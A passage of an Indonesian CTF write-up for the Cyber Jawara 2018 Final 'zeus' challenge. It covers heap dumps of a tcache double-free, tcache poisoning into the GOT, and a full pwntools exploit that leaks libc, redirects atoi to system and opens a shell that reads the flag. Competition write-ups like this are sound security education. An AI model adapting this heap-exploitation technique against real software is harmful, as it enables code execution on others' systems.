<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="string">'B'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (0x30)   tcache_entry[1]: 0x1bab350</span></span><br><span class="line"><span class="comment"># 0x1bab290:      0x0000000000000000      0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x1bab2a0:      0x4141414141414141      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab2b0:      0x0000000000000000      0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x1bab2c0:      0x6161616161616161      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab2d0:      0x0000000000000000      0x0000000000000031</span></span><br><span class="line"><span class="comment"># 0x1bab2e0:      0x0000000800000008      0x0000000001bab2a0</span></span><br><span class="line"><span class="comment"># 0x1bab2f0:      0x0000000001bab2c0      0x0000000001bab350</span></span><br><span class="line"><span class="comment"># 0x1bab300:      0x0000000000000000      0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x1bab310:      0x4242424242424242      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab320:      0x0000000000000000      0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x1bab330:      0x6262626262626262      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab340:      0x0000000000000000      0x0000000000000031</span></span><br><span class="line"><span class="comment"># 0x1bab350:      0x0000000000000000      0x0000000001bab310</span></span><br><span class="line"><span class="comment"># 0x1bab360:      0x0000000001bab330      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab370:      0x0000000000000000      0x000000000001fc91</span></span><br><span class="line"></span><br><span class="line">delete(<span class="string">'A'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (0x30)   tcache_entry[1]: 0x1bab2e0 --&gt; 0x1bab350</span></span><br><span class="line"><span class="comment"># 0x1bab290:      0x0000000000000000      0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x1bab2a0:      0x4141414141414141      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab2b0:      0x0000000000000000      0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x1bab2c0:      0x6161616161616161      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab2d0:      0x0000000000000000      0x0000000000000031</span></span><br><span class="line"><span class="comment"># 0x1bab2e0:      0x0000000001bab350      0x0000000001bab2a0 </span></span><br><span class="line"><span class="comment">#                      ^----------------- tcache_entry</span></span><br><span class="line"><span class="comment"># 0x1bab2f0:      0x0000000001bab2c0      0x0000000001bab350</span></span><br><span class="line"><span class="comment"># 0x1bab300:      0x0000000000000000      0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x1bab310:      0x4242424242424242      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab320:      0x0000000000000000      0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x1bab330:      0x6262626262626262      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab340:      0x0000000000000000      0x0000000000000031</span></span><br><span class="line"><span class="comment"># 0x1bab350:      0x0000000000000000      0x0000000001bab310</span></span><br><span class="line"><span class="comment"># 0x1bab360:      0x0000000001bab330      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab370:      0x0000000000000000      0x000000000001fc91</span></span><br><span class="line"></span><br><span class="line">delete(<span class="string">'B'</span> * <span class="number">8</span>)</span><br><span class="line"><span class="comment"># (0x30)   tcache_entry[1]: 0x1bab350 --&gt; 0x1bab2e0 --&gt; 0x1bab350 (overlap chunk with 0x1bab340(freed) ) !!!</span></span><br><span class="line"><span class="comment"># 0x1bab290:      0x0000000000000000      0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x1bab2a0:      0x4141414141414141      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab2b0:      0x0000000000000000      0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x1bab2c0:      0x6161616161616161      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab2d0:      0x0000000000000000      0x0000000000000031</span></span><br><span class="line"><span class="comment"># 0x1bab2e0:      0x0000000001bab350      0x0000000001bab2a0</span></span><br><span class="line"><span class="comment">#                      ^----------------- tcache_entry</span></span><br><span class="line"><span class="comment"># 0x1bab2f0:      0x0000000001bab2c0      0x0000000001bab350</span></span><br><span class="line"><span class="comment"># 0x1bab300:      0x0000000000000000      0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x1bab310:      0x4242424242424242      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab320:      0x0000000000000000      0x0000000000000021</span></span><br><span class="line"><span class="comment"># 0x1bab330:      0x6262626262626262      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab340:      0x0000000000000000      0x0000000000000031</span></span><br><span class="line"><span class="comment"># 0x1bab350:      0x0000000001bab2e0      0x0000000001bab310</span></span><br><span class="line"><span class="comment">#                      ^----------------- tcache_entry</span></span><br><span class="line"><span class="comment"># 0x1bab360:      0x0000000001bab330      0x0000000000000000</span></span><br><span class="line"><span class="comment"># 0x1bab370:      0x0000000000000000      0x000000000001fc91</span></span><br></pre></td></tr></table></figure>
<p>Dengan begitu payload sebelumnya untuk leak hanya perlu diubah sedikit untuk mengotrol tcache_entry ke got,</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fake_list = p64(<span class="number">0x602078</span>) <span class="comment"># tcache_entries -&gt; got</span></span><br><span class="line">fake_list += p64(<span class="number">0x00400505</span>) <span class="comment"># key : str.malloc</span></span><br><span class="line">fake_list += p64(<span class="number">0x602020</span>) <span class="comment"># value : reloc.puts</span></span><br><span class="line">fake_list += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line"></span><br><span class="line">insert(<span class="string">'A'</span> * <span class="number">8</span>, fake_list)</span><br></pre></td></tr></table></figure>
<p>tepat setelah beberapa kali malloc di fastbin[1], malloc akan return pointer di got.</p>
<h2 id="full-exploit"><a href="#full-exploit" class="headerlink" title="full-exploit"></a>full-exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"></span><br><span class="line">gdbcmd = <span class="string">'b *0x004011ca'</span></span><br><span class="line"></span><br><span class="line">context.terminal = <span class="string">'kitty @ new-window --new-tab --tab-title pwn --keep-focus sh -c'</span>.split()</span><br><span class="line"><span class="comment"># context.log_level = 'warn'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv.__len__() == <span class="number">3</span>:</span><br><span class="line">    r = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.28-9dc614ec33ee0284064ec5535bda431c.so'</span>, checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># r = process('/home/vagrant/ctf/cj/p11-zeus/zeus', aslr=False, env=&#123;'LD_PRELOAD':'./libc-2.28-9dc614ec33ee0284064ec5535bda431c.so'&#125;)</span></span><br><span class="line">    <span class="comment"># r = process('/home/vagrant/ctf/cj/p11-zeus/zeus', aslr=False)</span></span><br><span class="line">    r = process(<span class="string">'/home/vagrant/ctf/cj/p11-zeus/zeus'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="keyword">False</span>)</span><br><span class="line">    gdb.attach(r, gdbcmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(key, val)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, len(key).__str__())</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, key)</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, len(val).__str__())</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, val)</span><br><span class="line">    r.recvline(<span class="keyword">False</span>)</span><br><span class="line">    log.info(r.recvline(<span class="keyword">False</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(key)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, key)</span><br><span class="line">    log.info(r.recvline(<span class="keyword">False</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lookup</span><span class="params">(key)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, key)</span><br><span class="line">    r.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    <span class="keyword">return</span> r.recvline(<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">insert(<span class="string">'A'</span> * <span class="number">8</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">insert(<span class="string">'B'</span> * <span class="number">8</span>, <span class="string">'b'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'B'</span> * <span class="number">8</span>)</span><br><span class="line">delete(<span class="string">'A'</span> * <span class="number">8</span>)</span><br><span class="line">delete(<span class="string">'B'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">fake_list = p64(<span class="number">0x602078</span>) <span class="comment"># tcache_entries -&gt; got</span></span><br><span class="line">fake_list += p64(<span class="number">0x00400505</span>) <span class="comment"># key : str.malloc</span></span><br><span class="line">fake_list += p64(<span class="number">0x602020</span>) <span class="comment"># value : reloc.puts</span></span><br><span class="line">fake_list += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line"></span><br><span class="line">insert(<span class="string">'A'</span> * <span class="number">8</span>, fake_list)</span><br><span class="line"></span><br><span class="line">puts = u64(lookup(<span class="string">'malloc'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc.address = puts - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.info(hex(libc.address))</span><br><span class="line"></span><br><span class="line">insert(<span class="string">'B'</span> * <span class="number">8</span>, <span class="string">'b'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload  = p64(libc.symbols[<span class="string">'realloc'</span>]) <span class="comment"># realloc</span></span><br><span class="line">payload += p64(libc.symbols[<span class="string">'setvbuf'</span>]) <span class="comment"># setvbuf</span></span><br><span class="line">payload += p64(libc.symbols[<span class="string">'system'</span>]) <span class="comment"># atoi -&gt; system</span></span><br><span class="line">payload += p64(libc.symbols[<span class="string">'exit'</span>]) <span class="comment"># exit</span></span><br><span class="line"></span><br><span class="line">insert(<span class="string">'B'</span> * <span class="number">8</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">λ › python solve.py localhost 51100</span><br><span class="line">[+] Opening connection to localhost on port 51100: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">$ cat /var/flag/*</span><br><span class="line">CJ2018&#123;flag&#125;</span><br><span class="line">$ </span><br><span class="line">[*] Closed connection to localhost port 51100</span><br></pre></td></tr></table></figure>
<h2 id="rant"><a href="#rant" class="headerlink" title="rant"></a>rant</h2><p>Soalnya cukup menarik, baru solve pas beberapa menit-menit setelah lomba selesai karena sempet kesasar dengan asumsi bisa pakai poison-null-byte (╯°. °）╯︵ ┻━┻. 11/10 would ikut again.</p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/atom.xml">rss</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#desc"><span class="toc-number">1.</span> <span class="toc-text">desc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intro"><span class="toc-number">2.</span> <span class="toc-text">intro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#internals"><span class="toc-number">3.</span> <span class="toc-text">internals</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#safe-malloc"><span class="toc-number">3.1.</span> <span class="toc-text">safe-malloc (?)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#single-linked-list-data"><span class="toc-number">3.2.</span> <span class="toc-text">single linked-list data</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bug"><span class="toc-number">4.</span> <span class="toc-text">bug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#double-free"><span class="toc-number">4.1.</span> <span class="toc-text">double-free</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-one-null-byte"><span class="toc-number">4.2.</span> <span class="toc-text">off-by-one null byte</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">5.</span> <span class="toc-text">exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#leak"><span class="toc-number">5.1.</span> <span class="toc-text">leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-poisoning"><span class="toc-number">5.2.</span> <span class="toc-text">tcache poisoning</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#full-exploit"><span class="toc-number">6.</span> <span class="toc-text">full-exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rant"><span class="toc-number">7.</span> <span class="toc-text">rant</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&text=Cyber Jawara 2018 Final - zeus"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&title=Cyber Jawara 2018 Final - zeus"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&is_video=false&description=Cyber Jawara 2018 Final - zeus"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Cyber Jawara 2018 Final - zeus&body=Check out this article: https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&title=Cyber Jawara 2018 Final - zeus"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&title=Cyber Jawara 2018 Final - zeus"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&title=Cyber Jawara 2018 Final - zeus"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&title=Cyber Jawara 2018 Final - zeus"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&name=Cyber Jawara 2018 Final - zeus&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 zeroload
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/atom.xml">rss</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'zeroload-github-io';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


